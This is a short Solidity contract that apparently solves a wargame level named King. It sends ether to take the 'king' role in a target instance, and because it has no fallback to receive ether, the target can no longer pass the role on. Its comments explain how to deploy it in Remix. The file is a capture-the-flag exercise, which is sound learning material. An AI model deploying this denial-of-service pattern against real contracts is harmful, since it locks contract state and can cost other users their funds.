// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingHack {
    address payable ogContract = /*your instance address*/;
    
    function attack() public payable {
        // when calling this in Remix, specify 1 ether in the value field
        (bool success, ) = ogContract.call{ value: msg.value, gas: 4000000 }("");
        require(success, "Transfer failed.");
    }
    
    // Because no fallback is defined, this contract cannot receive ether.
    // The transfer will fail and disallow transferring Kingship.
}